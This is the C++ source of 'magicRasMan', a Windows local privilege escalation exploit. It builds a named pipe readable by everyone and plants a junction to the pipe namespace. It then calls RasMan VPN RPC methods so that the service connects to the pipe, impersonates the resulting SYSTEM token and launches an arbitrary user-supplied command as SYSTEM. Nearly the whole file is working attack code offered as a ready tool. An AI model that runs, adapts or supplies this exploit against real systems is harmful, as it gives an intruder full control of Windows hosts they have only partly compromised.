#include <iostream>
#include <strsafe.h>
#include <Shlobj.h>
#include <sddl.h>
#include <userenv.h>
#include <winternl.h>
#include "RasMan.h"
#include "rasman_h.h"

#pragma comment(lib, "Rasapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")


BOOL g_bInteractWithConsole = FALSE;
INT g_index = 0;
DWORD g_dwSessionId = 0;
LPWSTR g_pwszCommandLine = NULL;
HANDLE hfile;



VOID PrintUsage()
{
	wprintf(
		L"\nmagicRasMan v%ws\nProvided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM\n", VERSION
	);
	wprintf(
		L"Arguments:\n -c <CMD>\tExecute the command *CMD*\n -m <METHOD>\t\tChoose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface\n -i\t\tInteract with the new process in the current command prompt (default is non-interactive)\n"
	);
}

int wmain(int argc, wchar_t** argv)
{
	load();
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'i':
			g_bInteractWithConsole = TRUE;
			break;
		case 'c':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				g_pwszCommandLine = argv[1];
			}
			else
			{
				wprintf(L"[-] Missing value for option: -c\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				try
				{
					g_index = _wtoi(argv[1]);
				}
				catch (const std::exception&)
				{
					wprintf(L"[-] Missing value for option: -m\n");
					PrintUsage();
					return -1;
				}
			}
			else
			{
				wprintf(L"[-] Missing value for option: -m\n");
				PrintUsage();
				return -1;
			}
			break;

		default:
			wprintf(L"[-] Invalid argument: %ls\n", argv[1]);
			PrintUsage();
			return -1;
		}
		++argv;
		--argc;
	}

	if (g_bInteractWithConsole && g_dwSessionId)
	{
		wprintf(L"[-] More than one interaction mode was specified.\n");
		return -1;
	}

	if (!g_pwszCommandLine)
	{

		wprintf(L"[-] Please specify a command to execute\n");
		wprintf(L"[*] You can use -help to get help\n");
		return -1;
	}

	return DoMain();
}

DWORD DoMain()
{
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		goto cleanup;
	}

	wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);

	if (!GenerateRandomPipeName(&pwszPipeName))
	{
		wprintf(L"[-] Failed to generate a name for the pipe.\n");
		goto cleanup;
	}

	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
	{
		wprintf(L"[-] Failed to create a named pipe.\n");
		goto cleanup;
	}

	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe)))
	{
		wprintf(L"[-] Failed to connect the named pipe.\n");
		goto cleanup;
	}

	wprintf(L"[+] Named pipe \\pipe\\%ws listening...\n",pwszPipeName);

	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
	{
		wprintf(L"[-] Failed to trigger the Spooler service.\n");
		goto cleanup;
	}

	if (!Finish()) {
		wprintf(L"[-] Failed to Delete and Clean.\n");
		goto cleanup;
	}

	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0)
	{
		wprintf(L"[-] Operation failed or timed out.\n");
		goto cleanup;
	}

	GetSystem(hSpoolPipe);

cleanup:
	if (hSpoolPipe)
		CloseHandle(hSpoolPipe);
	if (hSpoolPipeEvent)
		CloseHandle(hSpoolPipeEvent);
	if (hSpoolTriggerThread)
		CloseHandle(hSpoolTriggerThread);

	return 0;
}

BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
{
	BOOL bResult = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	DWORD dwTokenPrivilegesSize = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;

	LPWSTR pwszPrivilegeName = NULL;

	if (hTokenToCheck)
	{
		// If a token handle was supplied, check this token
		hToken = hTokenToCheck;
	}
	else
	{
		// If a token handle wasn't supplied, check the token of the current process
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			wprintf(L"OpenProcessToken() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
	if (!pTokenPrivileges)
		goto cleanup;

	if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		LUID_AND_ATTRIBUTES laa = pTokenPrivileges->Privileges[i];
		DWORD dwPrivilegeNameLength = 0;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
		{
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			{
				wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}
		}

		dwPrivilegeNameLength++;
		pwszPrivilegeName = (LPWSTR)malloc(dwPrivilegeNameLength * sizeof(WCHAR));
		if (!pwszPrivilegeName)
			goto cleanup;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), pwszPrivilegeName, &dwPrivilegeNameLength))
		{
			wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}

		if (!_wcsicmp(pwszPrivilegeName, pwszPrivilegeToCheck))
		{
			TOKEN_PRIVILEGES tp = { 0 };

			ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = laa.Luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			{
				wprintf(L"AdjustTokenPrivileges() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}

			bResult = TRUE;
		}

		free(pwszPrivilegeName);

		if (bResult)
			break;
	}

cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (pTokenPrivileges)
		free(pTokenPrivileges);

	return bResult;
}

BOOL GenerateRandomPipeName(LPWSTR* ppwszPipeName)
{
	UUID uuid = { 0 };

	if (UuidCreate(&uuid) != RPC_S_OK)
		return FALSE;

	if (UuidToString(&uuid, (RPC_WSTR*)&(*ppwszPipeName)) != RPC_S_OK)
		return FALSE;

	if (!*ppwszPipeName)
		return FALSE;

	return TRUE;
}

HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName)
{
	HANDLE hPipe = NULL;
	LPWSTR pwszPipeFullname = NULL;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };

	pwszPipeFullname = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszPipeFullname)
		return NULL;

	StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws", pwszPipeName);

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		LocalFree(pwszPipeName);
		return NULL;
	}

	// The FILE_FLAG_OVERLAPPED flag is what allows us to create an async pipe.
	hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateNamedPipe() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	free(pwszPipeFullname);

	return hPipe;
}

HANDLE ConnectSpoolNamedPipe(HANDLE hPipe)
{
	HANDLE hPipeEvent = INVALID_HANDLE_VALUE;
	OVERLAPPED ol = { 0 };

	// Create a non-signaled event for the OVERLLAPED structure
	hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!hPipeEvent)
	{
		wprintf(L"CreateEvent() failed. Error: %d\n", GetLastError());
		return NULL;
	}

	ZeroMemory(&ol, sizeof(OVERLAPPED));
	ol.hEvent = hPipeEvent;

	// Connect the pipe asynchronously
	if (!ConnectNamedPipe(hPipe, &ol))
	{
		if (GetLastError() != ERROR_IO_PENDING)
		{
			wprintf(L"ConnectNamedPipe() failed. Error: %d\n", GetLastError());
			return NULL;
		}
	}

	return hPipeEvent;
}




DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam) {
	LPWSTR pwszPipeName = (LPWSTR)lpParam;
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	status = RpcStringBindingCompose(
		//(RPC_WSTR)L"650a7e26-eab8-5533-ce43-9c1dfce11511",
		NULL,
		(RPC_WSTR)L"ncalrpc",
		nullptr,
		(RPC_WSTR)L"VpnikeRpc",
		nullptr,
		&pszStringBinding
	);
	if (DEBUG)
	{
		wprintf(L"[*]RpcStringBindingCompose status: %d\n", status);
		wprintf(L"|__[*] String binding: %ws\r\n", pszStringBinding);
	}
	
	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	if(DEBUG)
		wprintf(L"|__[*] RpcBindingFromStringBinding status: %d\n", status);
	status = RpcStringFree(&pszStringBinding);
	if(DEBUG)
		wprintf(L"|__[*] RpcStringFree code:%d\n", status);
	RpcTryExcept
	{
		LPWSTR pwszFileName = NULL;
		pwszFileName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1\\%hs\\%ws", unc_temp_dir,pwszPipeName);
		long a = 1;
		/* Trigger function to achieve RPC communication */

		if (g_index == 1) {
			if(DEBUG)
				wprintf(L"[+] VpnProtEngGetInterface Called\n");
			status = Proc23_Rpc_VpnProtEngGetInterface(BindingHandle, 1, &pwszFileName, &pwszFileName, 1, &a, &a);
			
		}
		else if (g_index == 2) {
			if (DEBUG)
				wprintf(L"[+] VpnProtEngWinRtConnect Called\n");
			status = Proc26_Rpc_VpnProtEngWinRtConnect(BindingHandle, pwszFileName, pwszFileName, pwszFileName, pwszFileName);
		}
		//wprintf(L"Rpc_VpnProtEngGetInterface:%d\n", status);
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
		free(pwszFileName);
	}RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
	}RpcEndExcept
		return 0;
}

HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName)
{
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;
	HANDLE hDir = INVALID_HANDLE_VALUE;
	if (CreateDirectoryA((LPCSTR)new_temp_dir, NULL) != 0) {
		hDir = CreateFileA((LPCSTR)new_temp_dir, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
		if (hDir == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-]CreateFile Failed");
			exit(-1);
		}
	}
	else {
		hDir = CreateFileA((LPCSTR)new_temp_dir, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	}
	
	

	CreateJunction(hDir, L"\\??\\PIPE\\");
	CloseHandle(hDir);

	hThread = CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &dwThreadId);
	if (!hThread)
		wprintf(L"CreateThread() failed. Error: %d\n", GetLastError());

	Sleep(1500);
	

	return hThread;
}

BOOL Finish()
{
	HANDLE hDir = CreateFileA((LPCSTR)new_temp_dir, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (hDir == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-]CreateFile Failed");
		return FALSE;
	}
	DeleteJunction(hDir);
	CloseHandle(hDir);
	RemoveDirectoryA((LPCSTR)new_temp_dir);
	return TRUE;
}

BOOL GetSystem(HANDLE hPipe)
{
	BOOL bResult = FALSE;
	HANDLE hSystemToken = INVALID_HANDLE_VALUE;
	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	if (!ImpersonateNamedPipeClient(hPipe))
	{
		wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
	{
		wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (g_dwSessionId)
	{
		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
		{
			wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (LPWSTR)L"WinSta0\\default";

	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{
			if(DEBUG)
				wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

			RevertToSelf();

			if (!g_bInteractWithConsole)
			{
				if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
				{
					wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
					goto cleanup;
				}
				else
				{
					wprintf(L"[+] CreateProcessWithTokenW() OK\n");
				}
			}
			else
			{
				wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
				goto cleanup;
			}
		}
		else
		{
			wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}
	else
	{
		wprintf(L"[+] CreateProcessAsUser() OK\n");
	}

	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	bResult = TRUE;

cleanup:
	if (hSystemToken)
		CloseHandle(hSystemToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bResult;
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}